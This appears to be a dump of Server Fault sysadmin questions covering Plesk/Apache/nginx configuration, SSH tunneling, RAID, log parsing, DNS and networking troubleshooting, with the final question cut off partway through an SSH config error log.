</blockquote>

<ol start=""3"">
<li>Next I tried this</li>
</ol>

<pre><code>$ curl https://216.58.207.238 --resolve ""google.com:443:216.58.207.238"" -H ""Host: google.com""
</code></pre>

<p>But I got the same error message. So is it really not possible at all to open google.com by using the IP address?</p>
","<ip><http><curl><url><host>","2019-11-21 09:08:11"
"992712","Limitations to using many SSDs in computing server","<p>This is a beginner's question:</p>

<p>We have a powerful computing server for roughly 10 users which will be increasingly used for data processing. In the past the main bottleneck was I/O.</p>

<p>I was wondering if it is possible to have some kind of device to plug in a larger number of SSD drives (i.e. one for each user and additional ones for large datasets) and still enjoy the maximum read/write speeds for each disk separately. Optimally, the drives could be plugged in at runtime without reboot.</p>

<ul>
<li>Is this possible?</li>
<li>How could this be achieved (i.e. through which kinds of connectors)?</li>
<li>Is it done in practice?</li>
<li>What are the requirements for the server?</li>
</ul>
","<hard-drive><ssd><io><bottleneck><connector>","2019-11-21 10:25:59"
"992733","Communication between 2 different PC's with different IP addresses","<p>I am new to this networking domain.</p>

<p>I need to Implement one communication as described below.</p>

<p>I have 3 laptops, in that one laptop has both ethernet and wifi with different IP Addresses.</p>

<p>2nd laptop has Ethernet connected through LAN to 1st laptop.</p>

<p>3rd laptop has only wifi and 1st and 3rd both are in the same wifi network</p>

<p>1st laptop is like server and 2nd,3rd laptops both are clients.</p>

<p>Now I want to communicate 2nd and 3rd laptop directly with their IP address.</p>

<p>Note all these 3 laptops contains windows7/windows10</p>

<p>Laptop 1 has Ip address: for ethernet 30.0.0.16 and wifi 192.168.2.108</p>

<p>Laptop 2 has Ip Address: 30.0.0.17</p>

<p>Laptop 3 Has IP address: 192.168.2.186</p>

<p>please, anyone, have an idea about this type of communication please give me suggestions</p>
","<networking>","2019-11-21 12:07:34"
"782161","Lights not working on HP msa 2040","<p>I have HP MSA 2040, it has total of 12 disks 3 of the disk lights are off. How to check the issue? Or are they off due to any configuration or raid?</p>

<p>Another question how to check what raid is configured on HP MSA 2040?</p>
","<raid><configuration><hp><hp-modular-smart-array>","2016-06-06 09:12:33"
"992757","How many requests can a PHP web server handle per second?","<p>Given the following:</p>

<ul>
<li>I have an AWS EC2 t3.small instance.</li>
<li>The instance uses the most recent Ubuntu LTS as its operating system.</li>
<li>The instance has 2GB RAM and 2 CPU cores available.</li>
<li>I have installed modern versions of Nginx, PHP, and PHP-FPM.</li>
<li>All other services (MySQL, Redis, Supervisor, SMTP, and Cron) are installed on other instances.</li>
<li>I have deployed a RESTful API codebase to that instance.</li>
<li>The codebase uses a modern version of Symfony, Laravel, or CakePHP.</li>
<li>The instance takes around 100ms to respond to a single request.</li>
</ul>

<p>I have calculated that this instance can serve 20 requests per second. My logic is as follows:</p>

<ul>
<li>Each request takes around 100ms to respond.</li>
<li>Each core can respond to 10 requests per second.</li>
<li>The instance has two cores.</li>
</ul>

<p>Does this sound correct?</p>
","<nginx><php><amazon-ec2><http>","2019-11-21 14:44:09"
"872152","After updating php.ini via Plesk my htaccess file stopped working","<p>I need help remembering what I did to allow Plesk to use <code>.htaccess</code>.  I recently changed the PHP upload file size on a domain and suddenly my <code>.htaccess</code> directives stopped working.  That means I ""fixed"" something, probably in <code>httpd.conf</code>, and stupidly didn't propagate the fix to a not-automatically-overwritten-by-Plesk file.  (yup, idiot....)</p>

<p>My <code>.htaccess</code> file has a series of entries like the one shown below.  That's all it has in it.  The purpose is to allow me to have <code>example.com/command</code> execute a file <code>command</code> as if it were <code>command.php</code>.  I've been doing this for decades.  If you'll forgive me, if your answer is anything along the lines of ""don't do that..."", please refrain.  Thanks.</p>

<p><strong>.htaccess</strong></p>

<pre><code>&lt;Files support&gt;
    SetHandler proxy:unix:///var/www/vhosts/system/example.com/php-fpm.sock|fcgi://127.0.0.1:9000
&lt;/Files&gt;
</code></pre>

<p>I've tried posting those entries per Plesk's instructions into the Apache ""additional directives"" field (creating the <code>vhosts.conf</code> file, I did reconfigure so it was properly included) to no avail.</p>

<p><strong>http.conf</strong></p>

<pre><code>#ATTENTION!
#
#DO NOT MODIFY THIS FILE BECAUSE IT WAS GENERATED AUTOMATICALLY,
#SO ALL YOUR CHANGES WILL BE LOST THE NEXT TIME THE FILE IS GENERATED.
#IF YOU REQUIRE TO APPLY CUSTOM MODIFICATIONS, PERFORM THEM IN THE FOLLOWING FILES:
#/var/www/vhosts/system/example.com/conf/vhost.conf
#/var/www/vhosts/system/example.com/conf/vhost_ssl.conf
&lt;IfModule mod_ssl.c&gt;

    &lt;VirtualHost 216.55.178.166:7081 &gt;
            ServerName ""example.com:443""
            ServerAlias ""www.example.com""
            ServerAlias ""ipv4.example.com""
            ServerAdmin ""me@me.org""
            UseCanonicalName Off

            DocumentRoot ""/var/www/vhosts/example.com/web""
            CustomLog /var/www/vhosts/system/example.com/logs/access_ssl_log plesklog
            ErrorLog ""/var/www/vhosts/system/example.com/logs/error_log""

            &lt;IfModule mod_suexec.c&gt;
                    SuexecUserGroup ""me_phelps"" ""psacln""
            &lt;/IfModule&gt;

            &lt;IfModule mod_userdir.c&gt;

                    UserDir ""/var/www/vhosts/example.com/web_users/*""
            &lt;/IfModule&gt;

            &lt;IfModule mod_sysenv.c&gt;
                    SetSysEnv PP_VHOST_ID ""199da76e-b413-4968-8251-301b780838f1""
            &lt;/IfModule&gt;

            ScriptAlias ""/cgi-bin/"" ""/var/www/vhosts/example.com/web/cgi-bin/""

            Alias ""/plesk-stat"" ""/var/www/vhosts/system/example.com/statistics""
            &lt;Location  /plesk-stat/&gt;
                    Options +Indexes
            &lt;/Location&gt;
            &lt;Location  /plesk-stat/logs/&gt;
                    Require valid-user
            &lt;/Location&gt;
            Alias /webstat /var/www/vhosts/system/example.com/statistics/webstat
            Alias /webstat-ssl /var/www/vhosts/system/example.com/statistics/webstat-ssl
            Alias /ftpstat /var/www/vhosts/system/example.com/statistics/ftpstat
            Alias /anon_ftpstat /var/www/vhosts/system/example.com/statistics/anon_ftpstat
            Alias /awstats-icon /var/www/html/awstats/icon

            SSLEngine on
            SSLVerifyClient none
            SSLCertificateFile /usr/local/psa/var/certificates/certW5TKkGV

            &lt;Directory /var/www/vhosts/example.com/web&gt;

                    &lt;IfModule mod_fcgid.c&gt;
                            &lt;Files ~ (\.fcgi$)&gt;
                                    SetHandler fcgid-script
                                    Options +ExecCGI
                            &lt;/Files&gt;
                    &lt;/IfModule&gt;
                    &lt;IfModule mod_proxy_fcgi.c&gt;
                            &lt;Files ~ (\.php$)&gt;
                                    SetHandler proxy:unix:///var/www/vhosts/system/example.com/php-fpm.sock|fcgi://127.0.0.1:9000
                            &lt;/Files&gt;
                    &lt;/IfModule&gt;

                    SSLRequireSSL

                    Options -Includes +ExecCGI
            &lt;/Directory&gt;

            &lt;Directory ""/var/www/vhosts/system/example.com/statistics""&gt;
                    AuthType Basic
                    AuthName ""Domain statistics""
                    AuthUserFile ""/var/www/vhosts/system/example.com/pd/d..httpdocs@plesk-stat""
                    require valid-user
            &lt;/Directory&gt;

            Alias /error_docs /var/www/vhosts/example.com/error_docs
            ErrorDocument 400 /error_docs/bad_request.html
            ErrorDocument 401 /error_docs/unauthorized.html
            ErrorDocument 403 /error_docs/forbidden.html
            ErrorDocument 404 /error_docs/not_found.html
            ErrorDocument 500 /error_docs/internal_server_error.html
            ErrorDocument 405 /error_docs/method_not_allowed.html
            ErrorDocument 406 /error_docs/not_acceptable.html
            ErrorDocument 407 /error_docs/proxy_authentication_required.html
            ErrorDocument 412 /error_docs/precondition_failed.html
            ErrorDocument 414 /error_docs/request_uri_too_long.html
            ErrorDocument 415 /error_docs/unsupported_media_type.html
            ErrorDocument 501 /error_docs/not_implemented.html
            ErrorDocument 502 /error_docs/bad_gateway.html
            ErrorDocument 503 /error_docs/maintenance.html

            DirectoryIndex ""index.html"" ""index.cgi"" ""index.pl"" ""index.php"" ""index.xhtml"" ""index.htm"" ""index.shtml""

            Include ""/var/www/vhosts/system/example.com/conf/vhost_ssl.conf""

            &lt;Directory /var/www/vhosts/example.com&gt;
                    AllowOverride AuthConfig FileInfo Indexes Limit Options=Indexes,SymLinksIfOwnerMatch,MultiViews,FollowSymLinks,ExecCGI,Includes,IncludesNOEXEC
            &lt;/Directory&gt;

    &lt;/VirtualHost&gt;

&lt;/IfModule&gt;

&lt;VirtualHost 216.55.178.166:7080 &gt;
    ServerName ""example.com:80""
    ServerAlias ""www.example.com""
    ServerAlias ""ipv4.example.com""
    ServerAdmin ""me@me.org""
    UseCanonicalName Off

    DocumentRoot ""/var/www/vhosts/example.com/web""
    CustomLog /var/www/vhosts/system/example.com/logs/access_log plesklog
    ErrorLog ""/var/www/vhosts/system/example.com/logs/error_log""

    &lt;IfModule mod_suexec.c&gt;
            SuexecUserGroup ""me_phelps"" ""psacln""
    &lt;/IfModule&gt;

    &lt;IfModule mod_userdir.c&gt;

            UserDir ""/var/www/vhosts/example.com/web_users/*""
    &lt;/IfModule&gt;

    &lt;IfModule mod_sysenv.c&gt;
            SetSysEnv PP_VHOST_ID ""199da76e-b413-4968-8251-301b780838f1""
    &lt;/IfModule&gt;

    ScriptAlias ""/cgi-bin/"" ""/var/www/vhosts/example.com/web/cgi-bin/""

    Redirect permanent /plesk-stat https://example.com/plesk-stat
    Redirect permanent /webstat https://example.com/webstat
    Redirect permanent /webstat-ssl https://example.com/webstat-ssl
    Redirect permanent /ftpstat https://example.com/ftpstat
    Redirect permanent /anon_ftpstat https://example.com/anon_ftpstat
    Redirect permanent /awstats-icon https://example.com/awstats-icon

    &lt;IfModule mod_ssl.c&gt;
            SSLEngine off
    &lt;/IfModule&gt;

    &lt;Directory /var/www/vhosts/example.com/web&gt;

            &lt;IfModule mod_fcgid.c&gt;
                    &lt;Files ~ (\.fcgi$)&gt;
                            SetHandler fcgid-script
                            Options +ExecCGI
                    &lt;/Files&gt;
            &lt;/IfModule&gt;
            &lt;IfModule mod_proxy_fcgi.c&gt;
                    &lt;Files ~ (\.php$)&gt;
                            SetHandler proxy:unix:///var/www/vhosts/system/example.com/php-fpm.sock|fcgi://127.0.0.1:9000
                    &lt;/Files&gt;
            &lt;/IfModule&gt;

            Options -Includes +ExecCGI

    &lt;/Directory&gt;

    &lt;Directory ""/var/www/vhosts/system/example.com/statistics""&gt;
            AuthType Basic
            AuthName ""Domain statistics""
            AuthUserFile ""/var/www/vhosts/system/example.com/pd/d..httpdocs@plesk-stat""
            require valid-user
    &lt;/Directory&gt;

    Alias /error_docs /var/www/vhosts/example.com/error_docs
    ErrorDocument 400 /error_docs/bad_request.html
    ErrorDocument 401 /error_docs/unauthorized.html
    ErrorDocument 403 /error_docs/forbidden.html
    ErrorDocument 404 /error_docs/not_found.html
    ErrorDocument 500 /error_docs/internal_server_error.html
    ErrorDocument 405 /error_docs/method_not_allowed.html
    ErrorDocument 406 /error_docs/not_acceptable.html
    ErrorDocument 407 /error_docs/proxy_authentication_required.html
    ErrorDocument 412 /error_docs/precondition_failed.html
    ErrorDocument 414 /error_docs/request_uri_too_long.html
    ErrorDocument 415 /error_docs/unsupported_media_type.html
    ErrorDocument 501 /error_docs/not_implemented.html
    ErrorDocument 502 /error_docs/bad_gateway.html
    ErrorDocument 503 /error_docs/maintenance.html

    DirectoryIndex ""index.html"" ""index.cgi"" ""index.pl"" ""index.php"" ""index.xhtml"" ""index.htm"" ""index.shtml""

    Include ""/var/www/vhosts/system/example.com/conf/vhost.conf""

    &lt;Directory /var/www/vhosts/example.com&gt;
            AllowOverride AuthConfig FileInfo Indexes Limit Options=Indexes,SymLinksIfOwnerMatch,MultiViews,FollowSymLinks,ExecCGI,Includes,IncludesNOEXEC
    &lt;/Directory&gt;

&lt;/VirtualHost&gt;
</code></pre>

<p>I thought about changing <code>AllowOverride</code> to <code>All</code>, but using the <code>vhost.conf</code> file should have worked even with out it, shouldn't it?  The <code>vhost.conf</code> file is a perfectly suitable solution for me, as would getting my beloved <code>.htacess</code> capabilities back (despite the performance hit).  But for now, trying to execute <code>example.com/support</code> nets me an <code>Access Prohibited</code> error.  When I look at my error files, I find...</p>

<p><strong>example.com/logs/error_log</strong></p>

<pre><code>[proxy_fcgi:error] [pid 19834] [client 67.161.220.240:48094] AH01071: Got error 'Access to the script '/var/www/vhosts/example.com/web/support' has been denied (see security.limit_extensions)\n'
</code></pre>

<p>Note that I have tried setting <code>security.limit_extensions =</code> to blank, but that's not working, either.  I understand the security limitations, but I work on my own server, so I'm willing to take the risk.</p>

<p><strong>example.com/log/proxy_error_log (nginx)</strong></p>

<pre><code>[error] 27192#0: *115850 connect() failed (111: Connection refused) while connecting to upstream, client: 46.17.42.140, server: exammple.com, request: ""POST /support/contact_us HTTP/1.1"", upstream: ""http://1.1.1.1:7080/support/contact_us"", host: ""example.com""
</code></pre>

<p>And, for the sake of being thorough, the nginx config file.</p>

<p><strong>nginx.conf</strong></p>

<pre><code>#ATTENTION!
#
#DO NOT MODIFY THIS FILE BECAUSE IT WAS GENERATED AUTOMATICALLY,
#SO ALL YOUR CHANGES WILL BE LOST THE NEXT TIME THE FILE IS GENERATED.

server {
    listen 216.55.178.166:443 ssl;

    server_name example.com;
    server_name www.example.com;
    server_name ipv4.example.com;

    ssl_certificate             /usr/local/psa/var/certificates/certW5TKkGV;
    ssl_certificate_key         /usr/local/psa/var/certificates/certW5TKkGV;

    client_max_body_size 128m;

    root ""/var/www/vhosts/example.com/web"";
    access_log ""/var/www/vhosts/system/example.com/logs/proxy_access_ssl_log"";
    error_log ""/var/www/vhosts/system/example.com/logs/proxy_error_log"";

    location / {
            proxy_pass https://216.55.178.166:7081;
            proxy_set_header Host             $host;
            proxy_set_header X-Real-IP        $remote_addr;
            proxy_set_header X-Forwarded-For  $proxy_add_x_forwarded_for;
            proxy_set_header X-Accel-Internal /internal-nginx-static-location;
            access_log off;
    }

    location /internal-nginx-static-location/ {
            alias /var/www/vhosts/example.com/web/;
            internal;
    }

    location ~ ^/(plesk-stat|awstats-icon|webstat|webstat-ssl|ftpstat|anon_ftpstat) {
            proxy_pass https://216.55.178.166:7081;
            proxy_set_header Host             $host;
            proxy_set_header X-Real-IP        $remote_addr;
            proxy_set_header X-Forwarded-For  $proxy_add_x_forwarded_for;
            proxy_set_header X-Accel-Internal /internal-nginx-static-location;
            access_log off;
    }

    add_header X-Powered-By PleskLin;

}

server {
    listen 216.55.178.166:80;

    server_name example.com;
    server_name www.example.com;
    server_name ipv4.example.com;

    client_max_body_size 128m;

    root ""/var/www/vhosts/example.com/web"";
    access_log ""/var/www/vhosts/system/example.com/logs/proxy_access_log"";
    error_log ""/var/www/vhosts/system/example.com/logs/proxy_error_log"";

    location / {
            proxy_pass http://216.55.178.166:7080;
            proxy_set_header Host             $host;
            proxy_set_header X-Real-IP        $remote_addr;
            proxy_set_header X-Forwarded-For  $proxy_add_x_forwarded_for;
            proxy_set_header X-Accel-Internal /internal-nginx-static-location;
            access_log off;
    }

    location /internal-nginx-static-location/ {
            alias /var/www/vhosts/example.com/web/;
            internal;
    }

    location ~ ^/(plesk-stat|awstats-icon|webstat|webstat-ssl|ftpstat|anon_ftpstat) {
            proxy_pass http://216.55.178.166:7080;
            proxy_set_header Host             $host;
            proxy_set_header X-Real-IP        $remote_addr;
            proxy_set_header X-Forwarded-For  $proxy_add_x_forwarded_for;
            proxy_set_header X-Accel-Internal /internal-nginx-static-location;
            access_log off;
    }

    add_header X-Powered-By PleskLin;

}
</code></pre>
","<nginx><apache-2.4><.htaccess><plesk>","2017-09-05 16:18:15"
"992771","Linux complex file sharing between users","<p>Let's start with the elephant in the room: I have no formal training and I've been given a couple of small servers to manage for various, off-topic reasons. This to say that my knowledge is patchy. Please bear with me.</p>

<p>One of the servers is dedicated to heavy computation for a few users (less than 10) and I have been asked if I can enable fine-grain decision of file access policies between users.</p>

<p>What I mean with that is that my users wish to have a way to decide to grant access to their files in a per-file and per-user way. So that, for example, folderA is accessible by user1, user2 and user3, while folderB by user2 and user4 and folderC is not accessible by anyone other than the owner.</p>

<p>They, more or less, want a ""dropbox-style"" management of access management for their personal files, only for their local files, between the local users.</p>

<p>I was not able to find anything related, so I wonder if this is a feature that is reasonable to activate in terms of security and feasibility. I admit I never thought about it before, but it's a feature that makes sense in a multi-user server for cooperative tasks.</p>

<p>Since groups are not a solution (I need up to 30), Nextcloud is overkill and not for active projects you are coding on. Maybe git or PAM?</p>
","<file-permissions><groups>","2019-11-21 16:11:14"
"992816","RAID1 to store ~10 million files <3MB?","<p>I have many small files in all of my websites, which are backed up every day to local computer. Today I use external 2TB HDD, but due to lack of free space wanna buy additional HDD. So my goal is not just to increase capacity, but also provide additional protection. What about getting 8TB (2x4TB) RAID1 array? Is it worth it? I think 2 are better than 1.</p>
","<raid1>","2019-11-21 21:48:25"
"992891","Tunneling between two servers","<p>There are two servers in this network
The first server benefits from censored internet
The second server uses uncensored internet
The client can only connect to the first server and connect to the first server via the outline.
My intention is to tunnel from server to server in order to eliminate censorship. How do I tunnel the first server to the second one?
Both servers use centos..
Prefer simple, high-speed methods like ssh tunneling and so on
Please guide me with full description</p>

<p><a href=""https://i.sstatic.net/jSzch.png"" rel=""nofollow noreferrer"">This image can help you</a></p>
","<vpn><centos7><ssh-tunnel><tunneling>","2019-11-22 11:27:21"
"782296","Extracting From Logs","<p>I want to grep following information from below raw logs:</p>

<pre><code>2016-05-23 11:01:40 [1005583] 1b4ivg-004DZf-GX ** mustafa@hotmail.com F=&lt;abbas@DomainName&gt; P=&lt;abbas@DomainName&gt; R=dkim_lookuphost T=dkim_remote_smtp H=mx2.hotmail.com [65.54.188.72]:25 I=[IP Address]:56910 X=TLSv1.2:ECDHE-RSA-AES256-SHA384:256 CV=yes DN=""/CN=*.hotmail.com"": SMTP error from remote mail server after MAIL FROM:&lt;abbas@DomainName&gt; SIZE=275286: 421 RP-001 (BAY004-MC1F14) Unfortunately, messages from 16.23.21.111 weren't sent. Please contact your Internet service provider since part of their network is on our block list. You can also refer your provider to http://mail.live.com/mail/troubleshooting.aspx#errors.
2016-05-23 11:12:53 [1015989] 1b4j6h-004GIq-Ob ** tariq@hotmail.com F=&lt;corporate-kbl@DomainName&gt; P=&lt;corporate-kbl@DomainName&gt; R=lookuphost T=remote_smtp H=mx3.hotmail.com [65.55.37.120]:25 I=[IP Address]:51605 X=TLSv1.2:ECDHE-RSA-AES256-SHA384:256 CV=yes DN=""/CN=*.hotmail.com"": SMTP error from remote mail server after MAIL FROM:&lt;corporate-kbl@DomainName&gt; SIZE=17484: 550 SC-001 (COL004-MC4F44) Unfortunately, messages from 16.23.21.111 weren't sent. Please contact your Internet service provider since part of their network is on our block list. You can also refer your provider to http://mail.live.com/mail/troubleshooting.aspx#errors.
2016-05-23 11:13:19 [1020551] 1b4j76-004HUH-Nr ** yousuf@hotmail.com (muhammad.yousuf@DomainName) &lt;muhammad.yousuf@DomainName&gt; F=&lt;saeed.ahmed@DomainName&gt; P=&lt;saeed.ahmed@DomainName&gt; R=dkim_lookuphost T=dkim_remote_smtp H=mx3.hotmail.com [134.170.2.199]:25 I=[IP Address]:55971 X=TLSv1.2:ECDHE-RSA-AES256-SHA384:256 CV=yes DN=""/CN=*.hotmail.com"": SMTP error from remote mail server after MAIL FROM:&lt;saeed.ahmed@DomainName&gt; SIZE=24006: 550 DY-001 (BLU004-MC1F21) Unfortunately, messages from 16.23.21.111 weren't sent. Please contact your Internet service provider since part of their network is on our block list. You can also refer your provider to http://mail.live.com/mail/troubleshooting.aspx#errors.
</code></pre>

<p>As i have following set of error codes, they may occur if they occur error field shows error:</p>

<pre><code>421 RP-001
421 RP-002
421 RP-003
550 SC-001
550 SC-002
550 SC-003
550 SC-004
550 DY-001
550 DY-002
550 DY-001
550 OU-001
550 OU-002
</code></pre>

<p>As i have getting first three fields output from following command:</p>

<pre><code>  echo ""Timestamp            emailto:                  emailfrom:"" &amp;&amp; awk 'NF&gt;6 { d=6 ; while ( ! ($d ~ /^F=/ ) ) d++ ; printf ""%s\t%s\t%s\n"",$1,$6,substr($d,4,length($d)-4) ;} ' logs | column -t
</code></pre>

<p>What i want to get:</p>

<pre><code>  Timestamp:                    Email To:               Email From:            Messages From:       Error Codes:
 2016-05-23                mustafa@hotmail.com       abbas@DomainName          16.23.21.111         421 RP-001
 2016-05-23                tariq@hotmail.com       corporate-kbl@DomainName    16.23.21.111         550 SC-001
 2016-05-23                yousuf@hotmail.com      saeed.ahmed@DomainName      16.23.21.111         550 DY-001  
</code></pre>
","<bash><shell-scripting>","2016-06-06 19:06:14"
"872298","How to extract a tar file compressed multiple times over","<p>Due to some runaway poor scripting some files meant to be archived were compressed five or six times over. So there are files like this:</p>

<pre><code>a_log_file_0.log.1.tar.gz.tar.gz.tar.gz.tar.gz.tar.gz
</code></pre>

<p>Please how can I fix problematic files like this?</p>
","<linux><tar>","2017-09-06 12:20:35"
"872322","Transfer 300+ GB at maximum speed on two headless servers?","<p>I am currently trying to transfer over 300GB from my Mac Pro server to my Synology NAS. I only have my Windows PC I can work from, but I can SSH into both devices. They are both connected to gigabit ethernet, which I have tested and which works very good.</p>

<p>I have tried a few things already, such as SCP, FTP, SMB, and AFP, but they are generally limited to about 30 MB/s. 30 MB/s would mean, theoretically about 480 Mbps on my wired network. I should be able to do ~60 MB/s, as I need to both ""upload"" and ""download"" at the same time.</p>

<p>10GB takes about 5 minutes to transfer, meaning I probably need a good 2.5-3 hours before all my files are done transfering.</p>

<p>Is there a faster way than simply using this AFP, as I am doing right now? Maybe I hit a bottleneck somewhere, but I can't really see where that would be.</p>
","<ftp><server-message-block><scp><file-transfer><afp>","2017-09-06 14:33:50"
"872357","Any better alternative for WSUS report?","<p>I am using WSUS server on Server2012R2. The reporting function is really painful.</p>

<p>Sometimes I only need to have a simple report to see if a specific KB is installed or not on a list of computers from an OU. But WSUS report just wont gives you that simple answer.</p>

<p>Is there a better solution / software can generate the report for that?</p>
","<wsus>","2017-09-06 18:15:47"
"872364","shrinking EBS volume that used as root","<p>I have an EBS volume that is 800GB and I am using only 5GB of this. I want to shrink it but AWS doesn't support this, after a bit of a research, I have found that I can mount both volumes and rsync the content of the bigger one to the new one. This should work considering I have a data volume. While in my case, this is a root volume (mounted at ""/""). So rsync didn't work. </p>

<p>I have tried to mount both volumes to a different EC2 instance (so I can avoid having the big volume mounted ""/"") but I couldn't mount it. </p>

<pre><code>root@****:~# lsblk
NAME    MAJ:MIN RM    SIZE RO TYPE MOUNTPOINT
xvda    202:0    0      8G  0 disk
├─xvda1 202:1    0 1007.5K  0 part
└─xvda2 202:2    0      8G  0 part /
xvdf    202:80   0     10G  0 disk
xvdg    202:96   0    800G  0 disk
├─xvdg1 202:97   0 1007.5K  0 part
└─xvdg2 202:98   0    200G  0 part
root@****:~# sudo file -s /dev/xvdf
/dev/xvdf: Linux rev 1.0 ext4 filesystem data, UUID=ad182c34-1f1f-440b-af0b-3aa94ae57f71 (extents) (large files) (huge files)
root@****:~# sudo file -s /dev/xvdg
/dev/xvdg: DOS/MBR boot sector, extended partition table (last)
root@****:~# mkdir new old
root@****:~# mount /dev/xvdf new
root@****:~# mount /dev/xvdg old
mount: wrong fs type, bad option, bad superblock on /dev/xvdg,
       missing codepage or helper program, or other error

       In some cases useful info is found in syslog - try
       dmesg | tail or so.
</code></pre>

<p>Is there a way I can mirror everything in the big partition to the small one including file system and DOS/MBR boot sector? </p>
","<amazon-web-services><partition><amazon-ebs><disk-volume>","2017-09-06 19:05:07"
"992989","Why do I have 502 error with my GitLab server on Ubuntu?","<p>I installed GitLab using <a href=""https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-gitlab-on-ubuntu-18-04"" rel=""nofollow noreferrer"">digital ocean</a> tutorial</p>

<p>I got 502 error</p>

<p><a href=""https://i.sstatic.net/6lANi.png"" rel=""nofollow noreferrer""><img src=""https://i.sstatic.net/6lANi.png"" alt=""enter image description here""></a></p>

<p>I open 8081 port,and edit my gitlab.rb file properly</p>

<pre><code>unicorn[‘port’] = 8081
</code></pre>

<p>How to fix this?
Why is Nginx showing Bad Gateway?</p>

<p>My netstat output</p>

<pre><code>tcp        0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN      11833/unicorn maste 
tcp        0      0 127.0.0.1:9168          0.0.0.0:*               LISTEN      3230/puma 3.12.0 (t 
tcp        0      0 0.0.0.0:2224            0.0.0.0:*               LISTEN      1031/ruby           
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      1704/nginx: master  
tcp        0      0 127.0.0.1:8081          0.0.0.0:*               LISTEN      11833/unicorn master
</code></pre>
","<linux><ubuntu><gitlab>","2019-11-23 08:44:42"
"951626","I want to access my VM from multiple users, So how can i create the multiple user access?","<p>I need 2 users to access the same VM at the same time.
Can anyone please tell me, how to create multiple users and how to give access.</p>
","<windows-server-2016>","2019-01-31 05:04:44"
"993005","Why ping statment doesn't work on this Linux Ubuntu VM?","<p>I am not so into networking and I have the following doubt.</p>

<p>They provide me a <strong>Linux Ubuntu 18.04.3 LTS</strong> VM on which I have to install some tools.</p>

<p>The first thing that I tried was related to the Internet connectivity, so I tried to ping Google DNS:</p>

<pre><code>ping 8.8.8.8
</code></pre>

<p>obtaining no response. so I tried to ping google.com address: same situation.</p>

<p>Ok...I suspected that there is no Internet connection but...I tried to perform:</p>

<pre><code>wget http://google.com
</code></pre>

<p>and it seems to works fine: the <strong>index.html</strong> page related to google home was correctly downloaded.</p>

<p>So why the <strong>ping</strong> statment is not working on this VM? Where is the problem? It is a Linux configuration or something on the router?</p>
","<linux><ubuntu><linux-networking><ping><wget>","2019-11-23 11:08:34"
"993010","What does Linux refer to?","<p>A naive question maybe but what does Linux refer to?</p>

<p>I was reading an article (<a href=""https://www.androidauthority.com/an-introduction-to-python-on-android-759685/"" rel=""nofollow noreferrer"">Android Authority</a>) and it said ""if you want to create APKs then I recommend using Linux instead"".</p>

<p>Here is my understanding:</p>

<ul>
<li>Windows is a proprietary OS from Microsoft</li>
<li>Mac is a proprietary OS (based on Unix) from Apple</li>
</ul>

<p>When someone tells me to use Linux which version of Linux is he referring to Ubuntu, Fedora, Debian, ...</p>

<p>Thanks</p>
","<linux>","2019-11-23 11:31:01"
"993041","Intermittent DNS failures","<p>We have intermittent DNS failures. Upon troubleshooting we found from our server, (where the domain is pointed to)  gives connection timeout when queried against few TLD ns.
Ex: dig domain @tldns (Connection timed out;; no servers can be reached)</p>

<p>but dig domain @tldns +trace works. Will this connection timeouts cause intermittent failures or what is difference between +trace &amp; notrace?</p>

<p>NOTE: The TLD registar were able to resolve the same TLD nameservers from their servers.</p>
","<domain-name-system><firewall><amazon-route53><dig><tld>","2019-11-23 17:14:37"
"993067","How to access free internet through a server","<p>I have an internet connection which is limited to only connect to some local servers in my area. In this area, I own a server which access is wider than my internet connection and through this server, I can SSH another server which is located in Finland. I use Ubuntu 19.10 on my personal laptop. Both these two servers are CentOS minimal.</p>

<p>Now my question is that how can I connect my local server to my other server in Finland to gain free internet access to every website, and how should I connect my laptop to my local server?</p>

<p>Now I have SSHed to my local server to see serverfault, but I cannot see other sites like twitter with this internet.</p>

<p>Thanks in advance</p>
","<ssh><ssh-tunnel>","2019-11-24 00:48:17"
"993074","How do i connect to remote Potgresql server via Unix Doman Socket over SSH","<p>I have a two machines, my workstation running on Arch Linux and my cloud server running on Ubuntu.</p>

<p>I have installed Postgresql on my server, and it is accessible via Unix Domain Socket on the server itself, now i want to connect to the postgresql server from my workstation via ssh tunneling. I used the openssh socket tunneling to try to connect:</p>

<pre><code>ssh -L/tmp/postgresql:/var/run/postgresql production@&lt;ip&gt;
</code></pre>

<p>And to connect to the server i used the following command on the <code>psql</code> </p>

<pre><code>psql -h /tmp/postgresql
</code></pre>

<p>But i am getting the following error.</p>

<pre><code>psql: error: could not connect to server: could not connect to server: No such file or directory
        Is the server running locally and accepting
        connections on Unix domain socket ""/tmp/postgreql/.s.PGSQL.5432""?
</code></pre>

<p>Is something i doing wrong?</p>

<p>Thanks</p>
","<postgresql><ssh-tunnel><socket>","2019-11-24 07:02:31"
"872450","SNMP Trap passing notification to the script for further processing with NET-SNMP","<p>I have been trying to create a simple alert of interface down status  on dell s4810 switches by using NET-SNMP ""traphandle"". I was wondering how it could be possible to pass down notification information to the script so I could parse the text? I am able to activate the script but not pass down the notification. Perhaps there is a good python or perl module? I would be grateful for any advice or suggestion. </p>
","<net-snmp>","2017-09-07 06:34:32"
"782477","how to upgrade libc6 on debian 7.1?","<p>When trying to install pagespeed on my debian 7.1</p>

<pre><code>Unpacking mod-pagespeed-stable (from mod-pagespeed-stable_current_amd64.deb) ...
dpkg: dependency problems prevent configuration of mod-pagespeed-stable:
 mod-pagespeed-stable depends on libc6 (&gt;= 2.14); however:
  Version of libc6:amd64 on system is 2.13-38+deb7u11.

dpkg: error processing mod-pagespeed-stable (--install):
 dependency problems - leaving unconfigured
</code></pre>

<p>How to fix that ? (I guess I need to upgrade libc6, but no idea how)</p>
","<debian>","2016-06-07 13:28:23"
"782507","Can't SSH from one Digital Ocean droplet to another using Private LAN IP","<p>I have 2 Digital Ocean instances which have private LAN IP's. The first is 10.130.30.82 and the second is 10.130.35.154. I can ping the second from the first but not SSH. I have copied my keys to both servers using ssh-copy-id and have not altered sshd_config on the second server. My local machine and both servers are ubuntu,</p>

<p>SSH into the second from the first gives this error:</p>

<pre><code>/etc/ssh/ssh_config: line 11: Bad configuration option: hostkey
/etc/ssh/ssh_config: line 12: Bad configuration option: hostkey
/etc/ssh/ssh_config: line 13: Bad configuration option: hostkey
/etc/ssh/ssh_config: line 15: Bad configuration option: useprivilegeseparation
/etc/ssh/ssh_config: line 18: Bad configuration option: keyregenerationinterval
/etc/ssh/ssh_config: line 19: Bad configuration option: serverkeybits
/etc/ssh/ssh_config: line 22: Bad configuration option: syslogfacility
